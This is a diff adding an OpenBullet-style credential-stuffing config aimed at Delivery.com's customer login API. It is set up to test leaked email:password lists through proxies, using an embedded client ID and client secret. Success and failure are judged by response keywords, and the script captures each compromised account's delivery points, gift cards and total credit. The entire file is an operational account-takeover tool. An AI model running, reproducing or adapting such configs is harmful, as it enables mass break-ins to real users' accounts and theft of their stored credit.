@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Delivery.com",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-19T23:31:55.8556984+00:00",
+  "AdditionalInfo": "",
+  "Author": "Banana Frog <3",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_REQUEST REQUEST POST "https://www.delivery.com/api/customer/auth?client_id=MDlkMzY3Nzg3MjU1ZjRkNmY4OWZjNDA0NjBjMTI0MWZl" AutoRedirect=TRUE 
+  CONTENT "{\"client_secret\":\"97D3a046BXH11FATekQWQiV33B7RCC6A8rzHvhyn\",\"client_id\":\"MDlkMzY3Nzg3MjU1ZjRkNmY4OWZjNDA0NjBjMTI0MWZl\",\"grant_type\":\"password\",\"scope\":\"payment,global\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":true,\"account_integration_auth\":[{}]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: UgUOVl9TGwcCU1NXAQU=" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "acct_bad_credentials" 
+    KEY "The username or password was incorrect. Please try again or reset your password." 
+  KEYCHAIN Success OR 
+    KEY "delivery_points" 
+    KEY "access_token" 
+    KEY "user_id" 
+#Capture_Delivery_Points PARSE "<SOURCE>" JSON "delivery_points" Recursive=FALSE -> CAP "Delivery Points" "" "" 
+#Capture__Lifetime_Delivery_Points PARSE "<SOURCE>" JSON "life_time_delivery_points" Recursive=FALSE -> CAP "Lifetime Delivery Points" "" "" 
+#Capture_Gift_Cards PARSE "<SOURCE>" JSON "gift_cards" Recursive=FALSE -> CAP "Gift Cards" "" "" 
+#Capture_Total_Credit PARSE "<SOURCE>" JSON "total_credit" Recursive=FALSE -> CAP "Total Credit" "" "" 
